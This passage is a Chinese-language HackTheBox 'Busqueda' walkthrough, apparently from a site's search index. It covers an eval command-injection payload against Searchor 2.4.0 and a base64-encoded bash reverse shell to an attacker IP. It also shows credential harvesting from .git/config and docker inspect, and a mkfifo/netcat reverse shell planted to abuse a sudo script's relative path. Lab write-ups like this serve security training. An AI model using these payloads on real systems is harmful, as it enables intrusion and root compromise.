\u7684\u8bbf\u95ee\u6743\u9650\u3002\u5bf9\u7cfb\u7edf\u8fdb\u4e00\u6b65\u679a\u4e3e\uff0c \u5728<code>Git</code> \u914d\u7f6e\u6587\u4ef6\u4e2d\u53d1\u73b0\u51ed\u636e\uff0c\u5e76\u53ef\u4ee5\u767b\u5f55\u672c\u5730 <code>Gitea</code> \u670d\u52a1\u3002\u6b64\u5916\uff0c\u6211\u4eec\u53d1\u73b0\u7279\u5b9a\u7528\u6237\u53ef\u4ee5\u4f7f\u7528 <code>root</code> \u6743\u9650\u6267\u884c\u7cfb\u7edf\u68c0\u67e5\u811a\u672c\u3002\u901a\u8fc7\u5229\u7528\u6b64\u811a\u672c\uff0c\u6211\u4eec\u679a\u4e3e\u4e86 <code>anministrator</code> \u7528\u6237\u901a\u8fc7 <code>Gitea</code> \u8d26\u6237\u51ed\u636e\u7684 <code>Docker</code> \u5bb9\u5668\u3002\u5bf9 <code>Git</code> \u5b58\u50a8\u5e93\u4e2d\u7684\u6e90\u7801\u8fdb\u4e00\u6b65\u5206\u6790\uff0c\u63ed\u793a\u4e86\u4e00\u79cd\u5229\u7528\u76f8\u5bf9\u8def\u5f84\u5f15\u7528\u7684\u65b9\u6cd5\uff0c\u4e3a\u6211\u4eec\u6388\u4e88\u5177\u6709 <code>root</code> \u6743\u9650\u7684 RCE \u7a81\u7834\u53e3\u3002</p>"},{"location":"HTB/Busqueda-DOC/#_2","title":"\u9700\u8981\u7684\u77e5\u8bc6","text":"<ul> <li>Web \u679a\u4e3e</li> <li>Linux \u57fa\u7840\u77e5\u8bc6</li> <li>Python Basics</li> </ul>"},{"location":"HTB/Busqueda-DOC/#_3","title":"\u5b66\u4e60\u5230\u7684\u77e5\u8bc6","text":"<ul> <li>\u547d\u4ee4\u6ce8\u5165</li> <li>Python \u4ee3\u7801\u5ba1\u8ba1</li> <li>Docker \u57fa\u7840</li> </ul>"},{"location":"HTB/Busqueda-DOC/#_4","title":"\u4fe1\u606f\u6536\u96c6","text":""},{"location":"HTB/Busqueda-DOC/#nmap","title":"Nmap","text":"<p>\u8fd0\u884c Nmap \u626b\u63cf\u4e3b\u673a\u5f00\u653e\u7684\u7aef\u53e3\u548c\u670d\u52a1</p> <pre><code>ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.208 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)\nnmap -p$ports -sV 10.10.11.208\n</code></pre> <p></p> <p>\u626b\u63cf\u7ed3\u679c\u663e\u793a <code>SSH</code> \u8fd0\u884c\u5728\u5176\u9ed8\u8ba4\u7aef\u53e3\uff0c\u5e76\u4e14 <code>Apache</code> Web \u670d\u52a1\u5668\u6b63\u5728\u7aef\u53e3 <code>80</code> \u4e0a\u8fd0\u884c\u3002</p>"},{"location":"HTB/Busqueda-DOC/#http","title":"HTTP","text":"<p>\u8bbf\u95ee <code>80</code> \u7aef\u53e3\u540e\uff0c\u6211\u4eec\u88ab\u91cd\u5b9a\u5411\u5230\u57df\u540d: <code>searcher.htb</code>\u3002\u5c06\u8be5\u57df\u540d\u53ca\u5bf9\u5e94\u7684 IP \u5730\u5740\u6dfb\u52a0\u81f3 <code>/etc/hosts</code> \u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u4ee5\u5141\u8bb8\u6211\u4eec\u5728\u6d4f\u89c8\u5668\u4e2d\u8bbf\u95ee\u3002</p> <pre><code>echo \"10.10.11.208 searcher.htb\" | sudo tee -a /etc/hosts\n</code></pre> <p></p> <p>\u5728\u6d4f\u89c8\u5668\u4e2d\u8bbf\u95ee searcher.htb \u540e\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u201cSearcher\u201d\u5e94\u7528\u7a0b\u5e8f\u7684\u4e3b\u9875\u3002\u5b83\u4f3c\u4e4e\u662f\u4e00\u4e2a\u641c\u7d22\u5f15\u64ce\u805a\u5408\u5668\uff0c\u5141\u8bb8\u7528\u6237\u5728\u5404\u79cd\u641c\u7d22\u5f15\u64ce\u4e0a\u641c\u7d22\u4fe1\u606f\u3002</p> <p>\u7528\u6237\u53ef\u4ee5\u9009\u62e9\u641c\u7d22\u5f15\u64ce\uff0c\u8f93\u5165\u67e5\u8be2\uff0c\u7136\u540e\u81ea\u52a8\u91cd\u5b9a\u5411\u6216\u83b7\u53d6\u641c\u7d22\u7ed3\u679c\u7684 URL\u3002</p> <p></p> <p>\u70b9\u51fb <code>search</code> \u6309\u94ae\u540e\uff0c\u7f51\u7ad9\u4f1a\u63d0\u4f9b\u6307\u5b9a\u641c\u7d22\u5f15\u64ce\u7684 <code>URL</code>\u3002</p> <p></p>"},{"location":"HTB/Busqueda-DOC/#_5","title":"\u7acb\u8db3\u70b9","text":"<p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u7f51\u7ad9\u9875\u811a\u663e\u793a\u5b83\u6b63\u5728\u4f7f\u7528 <code>Flask</code> \u548c <code>Searchor</code> \u7248\u672c <code>2.4.0</code> \u3002</p> <p></p> <p>\u5982\u679c\u6211\u4eec\u70b9\u51fb\u7f51\u9875\u9875\u811a\u4e2d \u201cSearchor 2.4.0\u201d \u4e0a\u7684\u8d85\u94fe\u63a5\uff0c\u6211\u4eec\u5c06\u88ab\u91cd\u5b9a\u5411\u5230\u5176 GitHub \u5b58\u50a8\u5e93\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u68c0\u67e5\u5404\u4e2a\u53d1\u5e03\u7248\u672c\u7684\u53d8\u66f4\u65e5\u5fd7\u3002\u5176\u4e2d\u63d0\u5230\u5728 <code>2.4.2</code> \u7248\u672c\u4e2d\u4fee\u590d\u4e86\u4e00\u4e2a\u4f18\u5148\u6f0f\u6d1e\u3002\u8be5\u7f51\u7ad9\u4f7f\u7528\u7684\u7248\u672c\u662f <code>2.4.0</code>\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e\u3002</p> <p></p> <p>\u67e5\u770b\u8865\u4e01\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u62c9\u53d6\u8bf7\u6c42\u662f\u4e3a\u4e86\u4fee\u8865\u641c\u7d22\u529f\u80fd\u4e2d\u5b58\u5728\u7684\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u662f\u7531\u4e8e\u5bf9\u672a\u7ecf\u51c0\u5316\u7684\u7528\u6237\u8f93\u5165\u4f7f\u7528\u4e86 <code>eval</code> \u8bed\u53e5\u800c\u5bfc\u81f4\u7684\u3002</p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u67e5\u770b\u5177\u4f53\u7684 commit\uff0c\u5176\u4e2d\u663e\u793a\u4e86 <code>main.py</code> \u6587\u4ef6\u4e2d\u88ab\u66ff\u6362\u7684 <code>eval</code> \u8bed\u53e5\u3002</p> <p></p> <p>exploit</p> <p>\u6211\u4eec\u9664\u4e86\u5229\u7528\u73b0\u6210\u7684exploit,\u4e5f\u53ef\u4ee5\u5728\u672c\u5730\u8ba1\u7b97\u673a\u4e0a\u4e0b\u8f7d Searchor 2.4.0 \u6a21\u5757\u5e76\u5206\u6790\u5176\u4ee3\u7801\u3002</p> <p>```shell  wget https://github.com/ArjunSharda/Searchor/archive/refs/tags/v2.4.0.zip unzip v2.4.0.zip</p> <pre><code>\n\u68c0\u67e5 `main.py` \u6587\u4ef6\uff0c\u53d1\u73b0\u4e0e\u63d0\u4ea4\u7c7b\u4f3c\uff0c\u7528\u6237\u8f93\u5165\u76f4\u63a5\u4f20\u9012\u7ed9 `eval` \u8bed\u53e5\uff0c\u6ca1\u6709\u4efb\u4f55\u6821\u9a8c\u3002\n\n```shell\nnano Searchor-2.4.0/src/searchor/main.py\n</code></pre> <p></p> <p><code>search()</code> \u51fd\u6570\u63a5\u53d7\u56db\u4e2a\u53c2\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u5176\u4e2d\u4e24\u4e2a: <code>engine</code> \u548c <code>query</code>\u3002</p> <pre><code>searchor search Google \"hackthebox\"\n</code></pre> <p></p> <p>\u5728 CLI \u5de5\u5177\u4e2d\uff0c<code>engine</code> \u548c <code>query</code> \u53c2\u6570\u5206\u522b\u5bf9\u5e94\u4e8e\u7b2c\u4e8c\u4e2a\u548c\u7b2c\u4e09\u4e2a\u53c2\u6570\u3002\u5173\u4e8e\u547d\u4ee4\u6ce8\u5165\uff0c\u4f3c\u4e4e\u53ef\u4ee5\u6ce8\u5165\u4e24\u4e2a\u53c2\u6570\uff0c\u56e0\u4e3a\u5b83\u4eec\u76f4\u63a5\u4f20\u9012\u7ed9 <code>eval</code> \u8bed\u53e5\u3002\u4f46\u662f\uff0c\u5728\u5e94\u7528\u7a0b\u5e8f\u5185\uff0c\u5982\u679c\u5c1d\u8bd5\u5c06\u5f15\u64ce\u4fee\u6539\u4e3a\u9884\u5b9a\u4e49\u5f15\u64ce\u5217\u8868\u4e2d\u4e0d\u5b58\u5728\u7684\u9009\u9879\uff0c\u5219\u4f1a\u9047\u5230\u9519\u8bef\u3002</p> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u5fc5\u987b\u91cd\u70b9\u5229\u7528\u67e5\u8be2\u53c2\u6570\u4f5c\u4e3a\u6ce8\u5165\u70b9\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c<code>eval</code> \u8bed\u53e5\u901a\u5e38\u4e0d\u652f\u6301\u6267\u884c\u591a\u884c\uff0c\u5c3d\u7ba1\u6709\u4e00\u4e9b\u6280\u672f\u53ef\u4ee5\u5b9e\u73b0\u8fd9\u4e00\u70b9\u3002\u6b64\u5916\uff0c\u786e\u4fdd\u6211\u4eec\u7684\u6709\u6548\u8d1f\u8f7d\u4e0d\u4f1a\u7834\u574f <code>eval</code> \u8bed\u53e5\u7684\u524d\u9762\u90e8\u5206\u4e5f\u81f3\u5173\u91cd\u8981\u3002\u8003\u8651\u5230\u6240\u6709\u8fd9\u4e9b\u56e0\u7d20\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u6240\u793a\u7684\u6709\u6548\u8d1f\u8f7d\u6765\u5229\u7528\u6b64\u6f0f\u6d1e\u5e76\u5b9e\u73b0\u547d\u4ee4\u6ce8\u5165\u3002</p> <pre><code>') + str(__import__('os').system('id')) #\n</code></pre> <p>\u4e3a\u4e86\u786e\u4fdd <code>eval</code> \u8bed\u53e5\u5269\u4f59\u90e8\u5206\u7684\u6267\u884c\uff0c\u6211\u4eec\u5fc5\u987b\u4f7f\u7528 <code>+</code> \u8fd0\u7b97\u7b26\u5355\u72ec\u8fde\u63a5\u53e6\u4e00\u884c\u7684\u8f93\u51fa\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u672b\u5c3e\u7684 <code>#</code> \u7b26\u53f7\u5145\u5f53\u6ce8\u91ca\uff0c\u5ffd\u7565\u5176\u540e\u9762\u7684\u4efb\u4f55\u5185\u5bb9\u3002</p> <p>\u7136\u540e\u8bc4\u4f30\u7684\u6574\u4e2a\u547d\u4ee4\u5c06\u5982\u4e0b\u6240\u793a\uff1a <code>shell url = eval( Engine.&lt;some_engine&gt;.search('') + str(__import__('os').system('id')) #', copy_url={copy}, open_web={open})\" )</code></p> <p>\u8ba9\u6211\u4eec\u9996\u5148\u5728\u672c\u5730\u6d4b\u8bd5\u6709\u6548\u8d1f\u8f7d\u5e76\u9a8c\u8bc1\u4ee3\u7801\u6ce8\u5165\u662f\u5426\u6309\u9884\u671f\u5de5\u4f5c\u3002</p> <pre><code>searchor search Google \"')+ str(__import__('os').system'id'))#\"\n</code></pre> <p></p> <p><code>id</code> \u547d\u4ee4\u6210\u529f\u6267\u884c\u5e76\u8fd4\u56de\uff0c\u8bf4\u660e\u6211\u4eec\u7684\u6ce8\u5165\u6210\u529f\u4e86\u3002\u4e3a\u4e86\u9a8c\u8bc1\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u7684\u4ee3\u7801\u6267\u884c\uff0c\u6211\u4eec\u7ee7\u7eed\u5728 Web \u5e94\u7528\u7a0b\u5e8f\u7684 <code>query</code> \u53c2\u6570\u4e2d\u63d0\u4ea4 Payload\u3002</p> <pre><code>')+ str(__import__('os').system('id'))#\n</code></pre> <p></p> <p>\u6211\u4eec\u4ee5\u7528\u6237 <code>svc</code> \u7684\u8eab\u4efd\u6267\u884c\u4ee3\u7801</p> <p></p> <p>\u4e3a\u4e86\u5c06\u5176\u5229\u7528\u5230\u4ea4\u4e92\u5f0f shell \u4e2d\uff0c\u6211\u4eec\u9996\u5148\u5728\u672c\u5730\u8ba1\u7b97\u673a\u4e0a\u7684\u7aef\u53e3 <code>1337</code> \u4e0a\u542f\u52a8 <code>Netcat</code> \u4fa6\u542c\u3002</p> <pre><code>nc -nvlp 1337\n</code></pre> <p>\u7136\u540e\uff0c\u6211\u4eec\u5728 <code>Searcher</code> \u7f51\u7ad9\u7684 <code>query</code> \u53c2\u6570\u4e2d\u53d1\u9001\u4ee5\u4e0b Base64 \u7f16\u7801\u7684\u53cd\u5411 shell \u8d1f\u8f7d\u3002</p> <pre><code>')+ str(__import__('os').system('echo\nYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zNS8xMzM3IDA+JjE=|base64 -d|bash'))#\n</code></pre> <p>\u60a8\u53ef\u4ee5\u4f7f\u7528 revshells \u7b49\u7f51\u7ad9\u751f\u6210\u9002\u5408\u60a8\u7684 IP \u5730\u5740\u7684\u7f16\u7801\u6709\u6548\u8d1f\u8f7d\u3002</p> <p>\u6211\u4eec\u5728 <code>Netcat</code> \u76d1\u542c\u5668\u4e0a\u83b7\u5f97\u4e86\u4e00\u4e2a\u53cd\u5411 shell\u3002</p> <p></p> <p>\u7528\u6237\u6807\u5fd7\u53ef\u4ee5\u5728 <code>/home/svc/user.txt</code> \u83b7\u53d6\u3002</p> <pre><code>cat /home/svc/user.txt\n</code></pre>"},{"location":"HTB/Busqueda-DOC/#searchor","title":"\u4ec0\u4e48\u662f Searchor?","text":"<p>Searchor \u662f\u4e00\u4e2a\u7efc\u5408\u6027\u7684 Python \u5e93\uff0c\u5b83\u7b80\u5316\u4e86\u7f51\u9875\u6293\u53d6\u3001\u68c0\u7d22\u4efb\u4f55\u4e3b\u9898\u7684\u4fe1\u606f\u4ee5\u53ca\u521b\u5efa\u641c\u7d22\u67e5\u8be2 URL \u7684\u8fc7\u7a0b\u3002</p>"},{"location":"HTB/Busqueda-DOC/#_6","title":"\u6743\u9650\u63d0\u5347","text":"<p>\u901a\u8fc7\u679a\u4e3e\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u7684\u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u8bc6\u522b\u5b58\u50a8\u5728 <code>/var/www/app/.git/config</code> \u6587\u4ef6\u4e2d\u7684\u51ed\u8bc1\u5bf9 <code>cody:jh1usoih2bkjaspwe92</code> \u3002\u5b83\u8fd8\u5305\u542b\u5bf9 <code>gitea.searcher.htb</code> \u5b50\u57df\u7684\u5f15\u7528\u3002</p> <pre><code>cat /var/www/app/.git/config\n</code></pre> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u4f7f\u7528\u83b7\u5f97\u7684\u5bc6\u7801 <code>jh1usoih2bkjaspwe92</code> \u4ee5 <code>svc</code> \u7528\u6237\u8eab\u4efd\u901a\u8fc7\u200b\u200b SSH \u767b\u5f55\u3002</p> <pre><code>ssh svc@10.10.11.208\n</code></pre> <p></p> <p>\u56de\u5230 <code>gitea.searcher.htb</code> \u57df\uff0c\u8ba9\u6211\u4eec\u5728 <code>/etc/hosts</code> \u6587\u4ef6\u4e2d\u4e3a\u5176\u6dfb\u52a0\u4e00\u4e2a\u6761\u76ee\u3002</p> <pre><code>echo \"10.10.11.208 gitea.searcher.htb\" | sudo tee -a /etc/hosts\n</code></pre> <p>\u5728\u6d4f\u89c8\u5668\u4e2d\u8bbf\u95ee <code>gitea.searcher.htb</code> \u540e\uff0c\u6211\u4eec\u4f1a\u770b\u5230 <code>Gitea</code> \u4e3b\u9875\u3002</p> <p></p> <p>\u5728\u201cExplore\u201d\u90e8\u5206\u4e0b\uff0c\u53ef\u4ee5\u770b\u5230 Gitea \u5e94\u7528\u7a0b\u5e8f\u4e0a\u6709 2 \u4e2a\u7528\u6237\uff0c\u5206\u522b\u662f <code>cody</code> \u548c <code>administrator</code>\u3002</p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e4b\u524d\u83b7\u5f97\u7684\u51ed\u636e\u4ee5\u7528\u6237 <code>cody</code> \u8eab\u4efd\u767b\u5f55\uff0c\u5374\u53d1\u73b0\u540d\u4e3a <code>Searcher_site</code> \u7684\u79c1\u6709\u5b58\u50a8\u5e93\uff0c\u5176\u4e2d\u5305\u542b Searcher Web \u5e94\u7528\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801\u3002</p> <p></p> <p>\u7531\u4e8e\u6211\u4eec\u6ca1\u6709 andminisrator \u7528\u6237\u7684\u5bc6\u7801\uff0c\u56e0\u6b64\u6211\u4eec\u65e0\u6cd5\u68c0\u67e5\u4e0e\u8be5\u7528\u6237\u5173\u8054\u7684\u79c1\u6709\u5b58\u50a8\u5e93\u3002\u5c3d\u7ba1\u5982\u6b64\uff0c\u5982\u679c\u6211\u4eec\u7a0d\u540e\u83b7\u5f97\u5bc6\u7801\uff0c\u8bb0\u4f4f\u91cd\u65b0\u8bbf\u95ee\u8fd9\u4e00\u70b9\u662f\u503c\u5f97\u7684\u3002\u7ee7\u7eed\uff0c\u6211\u4eec\u53ef\u4ee5\u68c0\u67e5\u7528\u6237 <code>svc</code> \u7684 sudo \u6743\u9650\uff0c\u53d1\u73b0\u6211\u4eec\u53ef\u4ee5\u4ee5 <code>root</code> \u8eab\u4efd\u8fd0\u884c\u547d\u4ee4 <code>/usr/bin/python3 /opt/scripts/system-checkup.py *</code> </p> <pre><code>sudo -l\n</code></pre> <p></p> <p>\u5f53\u5c1d\u8bd5\u8bfb\u53d6\u6587\u4ef6 <code>/opt/scripts/system-checkup.py</code> \u65f6\uff0c\u7531\u4e8e <code>svc</code> \u7528\u6237\u6743\u9650\u4e0d\u8db3\uff0c\u6211\u4eec\u6536\u5230 <code>permission denied</code> \u9519\u8bef\u3002 <code>svc</code> \u7528\u6237\u53ea\u62e5\u6709\u8be5\u6587\u4ef6\u7684\u6267\u884c\u6743\u9650\uff0c\u6ca1\u6709\u8bfb\u53d6\u6743\u9650\u3002</p> <pre><code>ls -l /opt/scripts/system-checkup.py\n</code></pre> <p></p> <p>\u6267\u884c Python \u811a\u672c\u540e\uff0c\u4f1a\u51fa\u73b0\u4e00\u4e2a\u663e\u793a\u53ef\u7528\u53c2\u6570\u7684\u5e2e\u52a9\u83dc\u5355\u3002</p> <pre><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py *\n</code></pre> <p></p> <p>\u68c0\u67e5\u63d0\u4f9b\u7684\u53c2\u6570\uff0c<code>/opt/scripts/system-checkup.py</code> \u811a\u672c\u4f3c\u4e4e\u5141\u8bb8\u6211\u4eec\u67e5\u770b\u73b0\u6709\u7684 <code>Docker</code> \u5bb9\u5668\u3002\u4f7f\u7528 <code>docker-ps</code> \u53c2\u6570\uff0c\u5b83\u4f1a\u5217\u51fa\u6240\u6709\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668\u3002</p> <pre><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps\n</code></pre> <p></p> <p>\u5b83\u7c7b\u4f3c\u4e8e Docker \u5b9e\u7528\u7a0b\u5e8f\u7684 <code>docker ps</code> \u547d\u4ee4\u7684\u8f93\u51fa\u3002\u5f53\u4f7f\u7528 <code>docker-inspect</code> \u53c2\u6570\u6267\u884c\u811a\u672c\u65f6\uff0c\u4f7f\u7528\u4fe1\u606f\u8868\u660e\u5b83\u9700\u8981\u4e24\u4e2a\u7279\u5b9a\u53c2\u6570\uff1a <code>format</code> \u548c <code>container name</code> \u3002</p> <pre><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect\n</code></pre> <p></p> <p>\u5c3d\u7ba1\u6211\u4eec\u77e5\u9053\u5bb9\u5668\u540d\u79f0\uff0c\u4f46\u6211\u4eec\u4e0d\u77e5\u9053\u8fd9\u4e2a\u683c\u5f0f\u53c2\u6570\u6307\u7684\u662f\u4ec0\u4e48\u3002\u4f46\u662f\uff0c\u8003\u8651\u5230\u4f7f\u7528 <code>docker-ps</code> \u53c2\u6570\u548c <code>docker ps</code> \u547d\u4ee4\u7684\u811a\u672c\u8f93\u51fa\u4e4b\u95f4\u7684\u76f8\u4f3c\u6027\uff0c\u53ef\u4ee5\u5408\u7406\u5730\u5047\u8bbe\u811a\u672c\u4e2d\u7684 <code>docker-inspect</code> \u53c2\u6570\u5229\u7528 Docker \u5b9e\u7528\u7a0b\u5e8f\u7684 <code>docker inspect</code> \u547d\u4ee4\u3002\u56e0\u6b64\uff0c\u8ba9\u6211\u4eec\u770b\u4e00\u4e0b <code>docker inform</code> \u547d\u4ee4\u7684\u5e2e\u52a9\u83dc\u5355\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u5728\u8fd9\u91cc\u67e5\u770b<code>docker inspect</code>\u547d\u4ee4\u7684\u4f7f\u7528\u4fe1\u606f\u3002</p> <p></p> <p>\u6839\u636e\u6b64\u5904\u63d0\u4f9b\u7684\u4fe1\u606f\uff0cDocker \u5229\u7528 <code>Go</code> \u6a21\u677f\u4f7f\u7528\u6237\u80fd\u591f\u4fee\u6539\u7279\u5b9a\u547d\u4ee4\u7684\u8f93\u51fa\u683c\u5f0f\u3002\u8be5\u7f51\u7ad9\u7279\u522b\u63d0\u5230\u4e86 <code>{{json .}}</code> \u683c\u5f0f\u5316\u6a21\u677f\u7684\u7528\u6cd5\uff0c\u8be5\u6a21\u677f\u4ee5 JSON \u683c\u5f0f\u5448\u73b0\u6709\u5173\u5bb9\u5668\u7684\u6240\u6709\u4fe1\u606f\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>{{json .}}</code> \u4f5c\u4e3a\u811a\u672c\u7684 <code>docker-inspect</code> \u53c2\u6570\u6240\u9700\u7684\u683c\u5f0f\u53c2\u6570\u3002</p> <p>\u4e3a\u4e86\u65b9\u4fbf\u8bfb\u53d6 <code>JSON</code> \u8f93\u51fa\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>jq</code> \u5c06 JSON \u8f93\u51fa\u89e3\u6790\u4e3a\u53ef\u8bfb\u683c\u5f0f\u3002\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5b89\u88c5 <code>jq</code>\uff0c\u4f46\u662f\u5b83\u5df2\u7ecf\u5b58\u5728\u4e8e\u76ee\u6807\u8ba1\u7b97\u673a\u4e0a\u3002</p> <pre><code>sudo apt-get -y install jq\n</code></pre> <p>\u73b0\u5728\u8ba9\u6211\u4eec\u4f7f\u7528 <code>docker-inspect</code> \u6307\u5b9a\u7b26\u5408\u683c\u5f0f\u7684\u53c2\u6570\u8fd0\u884c\u811a\u672c\u3002</p> <pre><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u68c0\u67e5\u4e00\u4e0b\uff0c\u53d1\u73b0 <code>Env</code> \u90e8\u5206\u4e2d\u786c\u7f16\u7801\u7684 <code>Gitea</code> \u5bc6\u7801\uff0c\u8be5\u90e8\u5206\u7531\u73af\u5883\u53d8\u91cf\u7ec4\u6210\u3002</p> <pre><code>[** SNIP **]\n\"Tty\": false,\n\"OpenStdin\": false,\n\"StdinOnce\": false,\n\"Env\": [\n\"USER_UID=115\",\n\"USER_GID=121\",\n\"GITEA__database__DB_TYPE=mysql\",\n\"GITEA__database__HOST=db:3306\",\n\"GITEA__database__NAME=gitea\",\n\"GITEA__database__USER=gitea\",\n\"GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh\",\n\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\n\"USER=git\",\n\"GITEA_CUSTOM=/data/gitea\"\n ],\n\"Cmd\": [\n\"/bin/s6-svscan\",\n\"/etc/s6\"\n ],\n[** SNIP **]\n</code></pre> <p>\u4f7f\u7528\u83b7\u5f97\u7684\u5bc6\u7801 <code>yuiu1hoiu4i5ho1uh</code> \uff0c\u6211\u4eec\u53ef\u4ee5\u4ee5 <code>administrator</code> \u7528\u6237\u8eab\u4efd\u767b\u5f55 <code>Gitea</code> \u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>\u73b0\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u679a\u4e3e\u4e0a\u8ff0\u79c1\u6709\u5b58\u50a8\u5e93\u6765\u67e5\u627e <code>scripts</code> \u5b58\u50a8\u5e93\uff0c\u5176\u4e2d\u5305\u542b\u6211\u4eec\u5728\u8fdc\u7a0b\u4e3b\u673a\u7684 <code>/opt/scripts</code> \u76ee\u5f55\u4e2d\u770b\u5230\u7684\u6587\u4ef6\u3002</p> <p></p> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u5e94\u8be5\u68c0\u67e5 <code>system-checkup.py</code> \u6587\u4ef6\uff0c\u56e0\u4e3a\u6211\u4eec\u80fd\u591f\u5728\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u4ee5 <code>root</code> \u6743\u9650\u6267\u884c <code>/opt/scripts/system-checkup.py</code> \u6587\u4ef6\u3002\u5728\u5206\u6790\u4ee3\u7801\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u53d1\u73b0\u6211\u4eec\u5c1a\u672a\u68c0\u67e5\u7684 <code>full-checkup</code> \u53c2\u6570\u6267\u884c\u4e86\u4e00\u4e2a\u540d\u4e3a <code>full-checkup.sh</code> \u7684 bash \u811a\u672c\u3002</p> <p></p> <p>\u7279\u522b\u6709\u8da3\u7684\u662f\uff0c<code>system-checkup.py</code> \u811a\u672c\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84 <code>./full-checkup.sh</code> \u5f15\u7528 <code>full-checkup.sh</code> \u811a\u672c\uff0c\u800c\u4e0d\u662f\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\uff0c\u4f8b\u5982 <code>/opt/scripts/fullcheckup.sh</code> \uff0c\u5728 <code>system-checkup.py</code> \u6587\u4ef6\u4e2d\u3002\u8fd9\u8868\u660e <code>system-checkup.py</code> \u811a\u672c\u5c1d\u8bd5\u4ece\u6267\u884c <code>system-checkup.py</code> \u7684\u76ee\u5f55\u6267\u884c <code>full-checkup.sh</code>\u3002</p> <p>\u4ece <code>full-checkup.sh</code> \u6587\u4ef6\u6240\u5728\u7684 <code>/opt/scripts/</code> \u76ee\u5f55\u8fd0\u884c\u65f6\uff0c<code>system-checkup.py</code> \u6210\u529f\u6267\u884c\u3002</p> <pre><code>cd /opt/scripts/\nsudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup\n</code></pre> <p></p> <p>\u6211\u4eec\u73b0\u5728\u5c1d\u8bd5\u901a\u8fc7\u4ece\u5305\u542b\u6211\u4eec\u81ea\u5df1\u7684\u6076\u610f <code>full-checkup.sh</code> \u811a\u672c\u7684\u53e6\u4e00\u4e2a\u76ee\u5f55\u6267\u884c\u7cfb\u7edf\u68c0\u67e5\u811a\u672c\u6765\u5229\u7528\u5bf9 <code>full-checkup.sh</code> \u7684\u76f8\u5bf9\u5f15\u7528\u3002</p> <p>\u56e0\u6b64\uff0c\u8ba9\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6 <code>/tmp/full-checkup.sh</code> \u5e76\u5411\u5176\u4e2d\u63d2\u5165\u53cd\u5411 shell Payload\u3002</p> <pre><code>echo -en \"#! /bin/bash\\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;YOUR_IP&gt; 9001 &gt;/tmp/f\" &gt; /tmp/full-checkup.sh\n</code></pre> <p>\u7136\u540e\u6211\u4eec\u8d4b\u4e88\u5b83\u6267\u884c\u6743\u9650</p> <pre><code>chmod +x /tmp/full-checkup.sh\n</code></pre> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5728\u672c\u5730\u8ba1\u7b97\u673a\u7684\u7aef\u53e3 <code>9001</code> \u4e0a\u542f\u52a8 <code>Netcat</code> \u4fa6\u542c\u5668\u4ee5\u63a5\u6536\u53cd\u5411 shell\u3002</p> <pre><code>nc -nvlp 9001\n</code></pre> <p>\u6700\u540e\uff0c\u6211\u4eec\u5728\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u7684 <code>/tmp</code> \u76ee\u5f55\u4e2d\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u6765\u89e6\u53d1\u53cd\u5411 shell\u3002</p> <pre><code>cd /tmp\nsudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup\n</code></pre> <p>\u5728\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u8fd0\u884c\u4e0a\u8ff0\u547d\u4ee4\u540e\uff0c\u6211\u4eec\u4f1a\u5728\u4fa6\u542c\u5668\u7aef\u53e3 <code>9001</code> \u4e0a\u4ee5 <code>root</code> \u7528\u6237\u8eab\u4efd\u6536\u5230\u4e00\u4e2a shell\u3002</p> <p></p> <p>root flag \u5728 <code>/root/root.txt</code> \u83b7\u53d6\u3002</p> <pre><code>cat 